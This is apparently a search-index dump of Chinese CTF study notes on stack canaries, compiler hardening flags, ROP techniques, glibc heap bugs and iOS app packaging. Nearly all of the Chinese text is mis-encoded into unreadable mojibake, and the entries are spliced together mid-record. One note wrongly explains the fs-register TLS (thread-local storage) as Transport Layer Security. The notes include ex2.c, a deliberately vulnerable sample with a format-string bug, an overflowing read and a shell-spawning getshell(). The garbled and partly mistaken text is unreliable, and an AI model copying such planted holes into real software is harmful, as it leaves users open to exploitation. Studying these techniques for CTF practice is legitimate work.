å®ç°åŸç† #  å¼€å¯ Canary ä¿æŠ¤çš„ stack ç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š\nå½“ç¨‹åºå¯ç”¨ Canary ç¼–è¯‘åï¼Œåœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå– fs å¯„å­˜å™¨ 0x28 å¤„çš„å€¼ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ %ebp-0x8 çš„ä½ç½®ã€‚ è¿™ä¸ªæ“ä½œå³ä¸ºå‘æ ˆä¸­æ’å…¥ Canary å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š\nmov rax, qword ptr fs:[0x28]\rmov qword ptr [rbp - 8], rax åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œä¼šå°†è¯¥å€¼å–å‡ºï¼Œå¹¶ä¸ fs:0x28 çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¦‚æœæŠ‘æˆ–çš„ç»“æœä¸º 0ï¼Œè¯´æ˜ canary æœªè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¼šæ­£å¸¸è¿”å›ï¼Œè¿™ä¸ªæ“ä½œå³ä¸ºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡ºã€‚\nmov rdx,QWORD PTR [rbp-0x8]\rxor rdx,QWORD PTR fs:0x28\rje 0x4005d7 \u0026lt;main+65\u0026gt;\rcall 0x400460 \u0026lt;__stack_chk_fail@plt\u0026gt; è¿™æ„å‘³å¯ä»¥é€šè¿‡åŠ«æŒ __stack_chk_failçš„ got å€¼åŠ«æŒæµç¨‹æˆ–è€…åˆ©ç”¨ __stack_chk_fail æ³„æ¼å†…å®¹ (stack smash)ã€‚\nè¿›ä¸€æ­¥æ¥è¯´ï¼Œå¯¹äº Linux æ¥è¯´ï¼Œfs å¯„å­˜å™¨å®é™…ä¸ŠæŒ‡å‘çš„æ˜¯å½“å‰å‡½æ•°æ ˆçš„ TLS ç»“æ„ä¸­çš„ stack_guardï¼Œè¯¥å€¼ç”±å‡½æ•° security_init è¿›è¡Œåˆå§‹åŒ–ã€‚åˆå§‹åŒ–çš„å€¼ç”± glibc è®¡ç®—ï¼Œåœ¨è¿›å…¥å‡½æ•°çš„æ—¶å€™å°±å†™å…¥äº† Kernel ä¸­ã€‚\nPostScriptï¼š\n  GOT (Global Offset Table)ï¼šæ˜¯ä¸€ä¸ªå­˜å‚¨åœ¨æ•°æ®åŒºçš„åœ°å€è¡¨ã€‚å½“è¢«æ‰§è¡Œç¨‹åºè¯•å›¾å¯»æ‰¾ç¼–è¯‘æ—¶æœªçŸ¥çš„å…¨å±€å˜é‡æ—¶ï¼Œç¨‹åºå°±ä¼šå¯»æ‰¾è¿™ä¸ªè¡¨ã€‚\n  å»¶è¿Ÿç»‘å®šï¼šå³å‡½æ•°ç¬¬ä¸€æ¬¡è¢«ç”¨åˆ°æ—¶æ‰è¿›è¡Œç»‘å®šã€‚é€šè¿‡å»¶è¿Ÿç»‘å®šå¤§å¤§åŠ å¿«äº†ç¨‹åºçš„å¯åŠ¨é€Ÿåº¦ã€‚è€Œ ELF åˆ™ä½¿ç”¨äº†PLT (Procedure Linkage Table) çš„æŠ€æœ¯æ¥å®ç°å»¶è¿Ÿç»‘å®šã€‚\n  TSL (Transport Layer Security)ï¼šå‰èº«æ˜¯ç°åœ¨å·²ç»å¼ƒç”¨çš„ SSL (Secure Sockets Layer)ï¼ŒæŒ‡çš„æ˜¯é€šè¿‡è®¡ç®—æœºç½‘ç»œæä¾›é€šä¿¡å®‰å…¨æ€§çš„åŠ å¯†åè®®ã€‚è¯¦ç»†çš„æ¦‚è®ºä¿¡æ¯å¯å‚è§ï¼šSSL/TLS Sessionã€‚ä¸€èˆ¬çš„åè®®ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå¯è§ TLS/SSL åè®®æ˜¯ä»‹äºåº”ç”¨å±‚ä¸ä¼ è¾“å±‚ä¹‹é—´çš„åè®®ã€‚ä¸‹å›¾è§£é‡Šäº†å»ºç«‹ä¸€ä¸ª SSL Record çš„è¿‡ç¨‹ï¼š\ngraph TB;\rD1{Data}\rsubgraph 1.Fragment Data; D2[\u0026#34;|......|\u0026#34;]; end\rsubgraph 2.Compress Data \u0026lt;é€šå¸¸ä¸ä¼šæœ‰å‹ç¼©æ“ä½œ\u0026gt;;\rD3[\u0026#34;|......|MAC|\u0026lt;br\u0026gt;Add Message Authentication Code\u0026#34;];\rend\rsubgraph 3.Encrypt data; D4[\u0026#34;|..........|\u0026lt;br\u0026gt;cipher text\u0026#34;]; end\rsubgraph 4.Add header; D5[\u0026#34;|header|...........|\u0026lt;br\u0026gt;TLS record header.\u0026#34;]; end\rD1--\u0026gt;D2; D2--\u0026gt;D3; D3--\u0026gt;D4; D4--\u0026gt;D5 è¾ƒé«˜å±‚åˆ™å®Œæˆ Handshake, Change Cipher Spec, Alert, Application Data è¿™æ ·å››é¡¹ä»»åŠ¡ã€‚\nå…¶ä¸­æ¡æ‰‹çš„è¿‡ç¨‹å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼æ¥è¡¨ç¤ºï¼š\n TLS Handshake   +-----+ +-----+  | | | |  | | ClientHello | |  | o----------------------------\u0026gt; | |  | | | |  CLIENT | | ServerHello | | SERVER  | | [Certificate] | |  | | [ServerKeyExchange] | |  | | [CertificateRequest] | |  | | ServerHelloDone | |  | | \u0026lt;----------------------------o |  | | | |  | | [Certificate] | |  | | ClientKeyExchange | |  | | [CertificateVerify] | |  | | ** ChangeCipherSpec ** | |  | | Finished | |  | o----------------------------\u0026gt; | |  | | | |  | | ** ChangeCipherSpec ** | |  | | Finished | |  | | \u0026lt;----------------------------o |  | | | |  +-----+ +-----+   Experimentï¼š\nå°è¯•ä»¥ä¸‹çš„ C è¯­è¨€ç¨‹åºï¼š\n// test_canary.c int func(){ \tint a[20]; \treturn a[0]; }  int main(){ \tfunc(); \treturn 0; } ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤ç¼–è¯‘è¯¥ç¨‹åºç”Ÿæˆ ELF å¯æ‰§è¡Œæ–‡ä»¶ï¼š\n$ gcc -fstack-protector-all -o test_canary test_canary.c ä½¿ç”¨ gdb çš„ -ex ç‰¹æ€§æŸ¥çœ‹ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ func å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨ objdump -dï¼‰ï¼š\n$ gdb -batch -ex \u0026#39;file test_canary\u0026#39; -ex \u0026#39;disas func\u0026#39; Dump of assembler code for function func:  0x000000000000066a \u0026lt;+0\u0026gt;:\tpush %rbp  0x000000000000066b \u0026lt;+1\u0026gt;:\tmov %rsp,%rbp  0x000000000000066e \u0026lt;+4\u0026gt;:\tsub $0x60,%rsp  0x0000000000000672 \u0026lt;+8\u0026gt;:\tmov %fs:0x28,%rax  0x000000000000067b \u0026lt;+17\u0026gt;:\tmov %rax,-0x8(%rbp)  0x000000000000067f \u0026lt;+21\u0026gt;:\txor %eax,%eax  0x0000000000000681 \u0026lt;+23\u0026gt;:\tmov -0x60(%rbp),%eax  0x0000000000000684 \u0026lt;+26\u0026gt;:\tmov -0x8(%rbp),%rdx  0x0000000000000688 \u0026lt;+30\u0026gt;:\txor %fs:0x28,%rdx  0x0000000000000691 \u0026lt;+39\u0026gt;:\tje 0x698 \u0026lt;func+46\u0026gt;  0x0000000000000693 \u0026lt;+41\u0026gt;:\tcallq 0x540 \u0026lt;__stack_chk_fail@plt\u0026gt;  0x0000000000000698 \u0026lt;+46\u0026gt;:\tleaveq  0x0000000000000699 \u0026lt;+47\u0026gt;:\tretq End of assembler dump. å¯ä»¥çœ‹åˆ°å®ƒåœ¨ *func+8 çš„ä½ç½®åœ¨å‡½æ•°æ ˆä¸­åŠ å…¥äº† canaryã€‚åœ¨ *func+30 ä¸ *func+39 çš„ä½ç½®ä¼šæ£€æµ‹ canary æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ï¼Œå¹¶åœ¨å‘ç”Ÿé”™è¯¯æ—¶å»¶è¿Ÿç»‘å®šï¼ˆåœ¨ plt æ®µï¼‰äº† gibc å‡½æ•° \u0026lt;__stack_chk_fail\u0026gt;ã€‚\nç»•è¿‡æŠ€æœ¯ #  æ³„æ¼æ ˆä¸­çš„ Canary #  Canary è®¾è®¡ä¸ºä»¥å­—èŠ‚ \\x00 ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯ Canary å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚\næ³„éœ²æ ˆä¸­çš„ Canary çš„æ€è·¯æ˜¯è¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†ã€‚ è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ² Canaryï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚\nExperimentï¼š\nå­˜åœ¨æ¼æ´çš„ç¤ºä¾‹æºä»£ç å¦‚ä¸‹ï¼š\n// ex2.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;void getshell(void) {  system(\u0026#34;/bin/sh\u0026#34;); } void init() {  setbuf(stdin, NULL);  setbuf(stdout, NULL);  setbuf(stderr, NULL); } void vuln() {  char buf[100];  for(int i=0;i\u0026lt;2;i++){  read(0, buf, 0x200);  printf(buf);  } } int main(void) {  init();  puts(\u0026#34;Hello Hacker!\u0026#34;);  vuln();  return 0; } "},{"id":190,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/2.protection/","title":"2. Protection","section":"7.1.StackOverflow","content":" å‚è€ƒï¼š\n  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/\n  https://introspelliam.github.io/2017/09/30/linuxç¨‹åºçš„å¸¸ç”¨ä¿æŠ¤æœºåˆ¶/\n   ä¿æŠ¤æ‰‹æ®µ #  Canary #  ç®€å•åœ°è¯´ï¼š\n å‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œåœ¨è¿”å›åœ°å€ä¸å±€éƒ¨å˜é‡ä¹‹é—´è®¾ç½®äº†ä¸€ä¸ªç”¨æˆ·ä¸å¯çŸ¥çš„ Canaryï¼› åœ¨å‡½æ•°ç»“æŸè°ƒç”¨æ—¶ï¼Œå‡½æ•°æ£€æŸ¥è¿™ä¸ª Canary æ˜¯å¦è¢«ä¿®æ”¹ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ï¼›  gcc åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶ä»¥ä¸‹çš„å‡ ä¸ªå‚æ•°æ§åˆ¶æ ˆçš„ä¿æŠ¤ç¨‹åº¦ï¼š\n# ç¦ç”¨æ ˆå¸§ä¿æŠ¤ $ gcc -fno-stack-protector a.c  # å¼€å¯æ ˆå¸§ä¿æŠ¤ $ gcc -fstack-protector a.c  # å¯ç”¨æ ˆå¸§ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç  $ gcc -fstack-protector-all a.c Fortify #  Fortify æ˜¯ gcc çš„ä¸€ä¸ªæ£€æµ‹å·¥å…·ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘æ—¶æ£€æµ‹å±é™©çš„å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ï¼Œæ¯”å¦‚ memcpyã€strcpy ç­‰ã€‚\nå®ƒæœ‰å¼±å¼ºä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼š\n  D_FORTIFY_SOURCE è®¾ç½®ä¸º 1 è¿›è¡Œè¾ƒå¼±çš„æ£€æŸ¥ï¼š\n ç¨‹åºç¼–è¯‘æ—¶å°±ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œä½†æ˜¯ä¸ä¼šæ”¹å˜ç¨‹åºçš„åŠŸèƒ½ï¼› ç¨‹åºä»…ä»…åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æŸ¥ï¼Œè¿è¡Œæ—¶ä¸ä¼šæ£€æŸ¥ï¼›  $ gcc -D_FORTIFY_SOURCE=1 t.c   D_FORTIFY_SOURCE è®¾ç½®ä¸º 2 è¿›è¡Œè¾ƒå¼ºçš„æ£€æŸ¥ï¼š\n ç¨‹åºç¼–è¯‘æ—¶å¯èƒ½ä¼šæ”¹å˜ç¨‹åºæ‰§è¡Œçš„å‡½æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼› ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥åˆ°ç¼“å†²åŒºæº¢å‡ºä¼šç»ˆæ­¢ç¨‹åºï¼›  $ gcc -D_FORTIFY_SOURCE=2 t.c   NX (DEP) #  è¿™ä¸€æŠ€æœ¯çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨çš„å†…å­˜é¡µæ ‡æ³¨ä¸ºä¸å¯æ‰§è¡Œï¼Œç¨‹åºè¯•å›¾åœ¨æ•°æ®ä¸Šæ‰§è¡Œä»£ç æ—¶ï¼ŒCPU ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\ngcc é»˜è®¤å¼€å¯äº† NX é€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼æ§åˆ¶ NX ä¿æŠ¤ï¼š\n# ç¦ç”¨ NX ä¿æŠ¤ $ gcc -z execstack t.c  # å¼€å¯ NX ä¿æŠ¤ $ gcc -z noexecstack t.c PIE (ASLR) #  PIE: Position Independent Executableï¼ˆä½ç½®ç‹¬ç«‹å¯æ‰§è¡Œï¼‰ã€‚gcc é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼æ§åˆ¶æ˜¯å¦å¼€å¯ PIEï¼š\n# PIE é»˜è®¤å¼€å¯ $ gcc --enable-default-pie t.c  # å…³é—­ PIE $ gcc -no-pie t.c ä½†æ˜¯åœ¨ Linux å¹³å°ä¸‹ï¼Œå³ä½¿æ–‡ä»¶å¼€å¯äº† PIE ä¿æŠ¤ï¼Œè¿˜éœ€è¦ç³»ç»Ÿå¼€å¯ ASLR æ‰ä¼šæ‰“ä¹±åŸºå€ï¼Œå¦åˆ™ç¨‹åºä»ç„¶ä¼šåŠ è½½åœ¨ä¸€ä¸ªå›ºå®šçš„åŸºå€ä¸Šï¼ˆåªä¸è¿‡å’Œä¸å¼€å¯ PIE ä¸ä¸€æ ·ï¼‰ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶æ–‡ä»¶ /proc/sys/kernel/randomize_va_space æ§åˆ¶æ˜¯å¦å¼€å¯ ASLRï¼š\n 0ï¼šè¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚ 1ï¼šè¡¨ç¤ºå°† mmap çš„åŸºå€ï¼Œstack å’Œ vdso é¡µé¢éšæœºåŒ–ã€‚ 2ï¼šè¡¨ç¤ºåœ¨ 1 çš„åŸºç¡€ä¸Šå¢åŠ å †åŒºåŸºå€çš„éšæœºåŒ–ï¼ˆä¸‹å›¾ä¸­çš„ Random brk offsetï¼‰ã€‚  Relro #  gccã€gnu linkerã€glic-dynamic-linker ä¸€èµ·é…åˆå®ç°äº†ä¸€ç§å«åš Relro çš„æŠ€æœ¯ï¼ˆRead Only Relocationï¼‰ã€‚\nå®ç°æ–¹å¼å°±æ˜¯é€šè¿‡ linker æŒ‡å®šæ–‡ä»¶çš„çš„éƒ¨åˆ†åŒºåŸŸæ ‡è®°ä¸ºåªè¯»åŒºåŸŸã€‚\nåœ¨ gcc ä¸­æŒ‡å®šä»¥ä¸‹çš„å‚æ•°å¯ä»¥æ§åˆ¶ç¼–è¯‘çš„æ–¹å¼ï¼š\n$ gcc -z norelro t.c\t# å…³é—­  $ gcc -z lazy t.c\t# éƒ¨åˆ†å¼€å¯ï¼Œå¯å†™  $gcc -z now t.c\t# å…¨éƒ¨å¼€å¯ï¼Œåªè¯» "},{"id":191,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/3.rop/","title":"3. Rop","section":"7.1.StackOverflow","content":"ROP æŠ€æœ¯ #  åŸºæœ¬ ROP #  ret2text #  ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚ä¾‹å­\nret2shellcode #  ret2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚ä¾‹å­\nret2syscall #  ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ä¾‹å­\næ­¤æ—¶å°±éœ€è¦ç”¨åˆ° ROP é“¾äº†ï¼Œå¾—åˆ° ROP é“¾å¯ä»¥ä½¿ç”¨ ROPgadget è¿™ä¸ªå·¥å…·ï¼Œè§ TIPS\nret2libc #  ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(\u0026quot;/bin/sh\u0026quot;)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚\nä¸­çº§ ROP #  ret2csu #  åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgetsã€‚\nè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚\nBROP #  é»‘ç›’æµ‹è¯•çš„åŠæ³•ã€‚è§ï¼šhttp://www.scs.stanford.edu/brop/bittau-brop.pdf\né«˜çº§ ROP #  ret2dlresolve #  è¦æƒ³å¼„æ‡‚è¿™ä¸ª ROP åˆ©ç”¨æŠ€å·§ï¼Œéœ€è¦é¦–å…ˆç†è§£ ELF æ–‡ä»¶çš„åŸºæœ¬ç»“æ„ä»¥åŠåŠ¨æ€é“¾æ¥çš„åŸºæœ¬è¿‡ç¨‹ï¼šElfFormat\nåœ¨ç¨‹åºæ‰§è¡Œå»¶è¿Ÿç»‘å®šçš„å‡½æ•°æ—¶å®é™…ä¸Šä¼šè·³åˆ° PLT ä¸­ä¿å­˜çš„åœ°å€æ‰§è¡Œï¼Œè¿™ä¸ªåœ°å€ä¸ŠåŒ…å«äº†ä¸‰è¡Œå‡½æ•°ã€‚æˆ‘ä»¬ä»¥ write@plt ä¸¾ä¾‹ï¼š\n$ objdump --disassemble-all ret2dlresolve | grep -A 3 \u0026#34;write@plt\u0026#34; 00000490 \u0026lt;write@plt\u0026gt;:  490: ff a3 1c 00 00 00 jmp *0x1c(%ebx)  496: 68 20 00 00 00 push $0x20  49b: e9 a0 ff ff ff jmp 440 \u0026lt;.plt\u0026gt; ....  ç¬¬ä¸€è¡Œæ˜¯ç›´æ¥è·³è½¬åˆ° GOT è¡¨ä¸­ï¼Œwrite å‡½æ•°çš„çœŸå®åœ°å€ã€‚ç¨‹åºåˆšåŠ è½½æ—¶ï¼ŒGOT è¡¨ä¸­çš„åœ°å€éƒ½æ˜¯æŒ‡å‘ PLT è¡¨çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œå³ä¸Šå›¾ä¸­çš„ 496ï¼› ç¬¬äºŒè¡Œå°† 0x20 å…¥æ ˆï¼Œå‡†å¤‡å°†å…¶ä½œä¸ºå‚æ•°è°ƒç”¨å‡½æ•°ï¼› ç¬¬ä¸‰è¡Œè°ƒç”¨ .plt è¡¨ã€ç¬¬ 440 è¡Œçš„æŒ‡ä»¤ã€‚è¿™ä¸ªä½ç½®çš„æŒ‡ä»¤æŠŠ link_map=*(GOT+4)ï¼ˆå³é“¾æ¥å™¨çš„æ ‡è¯†ä¿¡æ¯ï¼‰ä½œä¸ºå‚æ•°æ¨å…¥æ ˆä¸­ï¼Œç„¶åè°ƒç”¨ *(GOT+8)ï¼ˆä¿å­˜çš„æ˜¯_dl_runtime_resolveå‡½æ•°çš„åœ°å€ï¼‰ã€‚  ä¸Šé¢çš„æ“ä½œå®é™…è°ƒç”¨çš„æ˜¯ _dl_runtime_resolve(link_map, reloc_arg)ï¼Œè¯¥å‡½æ•°ä¼šå®Œæˆç¬¦å·çš„è§£æï¼Œå³å°†çœŸå®çš„ write å‡½æ•°åœ°å€å†™å…¥å…¶ GOT æ¡ç›®ä¸­ï¼ŒéšåæŠŠæ§åˆ¶æƒäº¤ç»™ write å‡½æ•°ã€‚\n_dl_runtime_resolve æ˜¯åœ¨ glibc-2.23/sysdeps/i386/dl-trampoline.S ä¸­ç”¨æ±‡ç¼–å®ç°çš„ã€‚0xf7fededb å¤„å³è°ƒç”¨ _dl_fixupï¼Œå¹¶ä¸”é€šè¿‡å¯„å­˜å™¨ä¼ å‚ã€‚\nSROP #  "},{"id":192,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/0.%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/","title":"0.æ¼æ´ç±»å‹","section":"7.3.GlibcHeap","content":"æ¼æ´ç±»å‹ #  Off By One æ¼æ´ #  æ¼æ´åŸç† #  ä¸¥æ ¼æ¥è¯´ off-by-one æ¼æ´æ˜¯ä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´ï¼Œoff-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œå•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯å› ä¸º Linux çš„å †ç®¡ç†æœºåˆ¶ ptmalloc éªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäº Linux å †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§ã€‚\nåˆ©ç”¨æ€è·¯ #  æ ¹æ®æº¢å‡ºçš„å­—èŠ‚ç±»å‹ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š\n æº¢å‡ºå­—èŠ‚ä¸ºä»»æ„å¯ä»¥æ§åˆ¶çš„å­—èŠ‚ã€‚é€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²æˆ–è¦†ç›–å…¶ä»–å—çš„æ•°æ®ã€‚ æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ã€‚åœ¨ size=0x100 æ—¶ï¼Œæº¢å‡º NULL å­—èŠ‚ä¼šä½¿ prev_in_use ä½è¢«æ¸…é›¶ï¼š  è¿™æ—¶å¯ä»¥é€‰æ‹© unlink æ–¹æ³•è¿›è¡Œå¤„ç†ï¼ˆæ¼æ´åˆ©ç”¨æ–¹å¼ unlinkï¼‰ï¼› å¦å¤– prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œä¼ªé€  prev_size å¯ä»¥é€ æˆå—ä¹‹é—´çš„é‡å ï¼ˆglibc2.28 å·²ç»ä¿®å¤ï¼‰ã€‚    ä½¿ç”¨ç¤ºä¾‹ #  Asis CTF 2016 b00ks\nUse After Free æ¼æ´ #  æ¼æ´åŸç† #  Use After Free å³é‡Šæ”¾åé‡ç”¨ï¼Œå¯ä»¥åˆ©ç”¨çš„æ¼æ´ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š\n å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œåœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä¿®æ”¹ã€‚ å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç è¿›è¡Œäº†ä¿®æ”¹ã€‚  æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚\nå¦‚æœæŠ¥é”™å†…å®¹å‡ºç° segment fault (core dumped) ä¸€èˆ¬å°±æ˜¯è¿™ä¸ªæƒ…å†µå¯¼è‡´çš„ã€‚\nä½¿ç”¨ç¤ºä¾‹ #  Hitcon Traning lab10\nDouble Free æ¼æ´ #  "},{"id":193,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/1.unlink/","title":"1. Unlink","section":"7.3.GlibcHeap","content":"Unlink #  unlink æ˜¯ä»€ä¹ˆï¼Ÿ\n å®ƒæ˜¯ glibc ä¸­é€šè¿‡å®å®ç°çš„ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨ GlibcHeap ä¸­æœ‰æºç ä»‹ç»ï¼› unlink çš„ç›®çš„æ˜¯å°† bin é“¾è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ä»é“¾è¡¨ä¸­å–å‡ºï¼›  "},{"id":194,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E6%AD%A3%E5%90%91%E5%9F%BA%E7%A1%80/","title":"1.æ­£å‘åŸºç¡€","section":"iOSé€†å‘åˆ†æ","content":"æ­£å‘åŸºç¡€ #  App ç»“æ„ä¸æ„å»º #  åº”ç”¨åŒ…çš„æœ¬è´¨ï¼Ÿ\niOS ä¸­çš„åº”ç”¨åŒ…æœ‰ .app ä¸ .ipa ä¸¤ç§å½¢å¼ï¼Œå‰è€…å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåè€…æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹çš„ zip æ ¼å¼å‹ç¼©åŒ…ï¼ˆAndroid ä¸­çš„ .apkï¼‰ã€‚\nå¦‚ä½•è·å–ä¸€ä¸ªçº¿ä¸Š App çš„ ipa æ–‡ä»¶åŒ…ï¼Ÿ\nåœ¨ iTunes ä¹‹åï¼Œè‹¹æœå®˜æ–¹æä¾›äº†ä¸€ä¸ªæ–¹æ³•è¿›è¡Œ ipa çš„ä¸‹è½½ï¼Œå³åº”ç”¨ï¼šApple Configurator 2ã€‚åœ¨è¿™ä¸ªåº”ç”¨ä¸­ä¸‹è½½äº† App ä¹‹åï¼Œå¯ä»¥åœ¨ä»¥ä¸‹çš„æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ° ipa æ–‡ä»¶ï¼š\n /Users/shesonglin/Library/Group 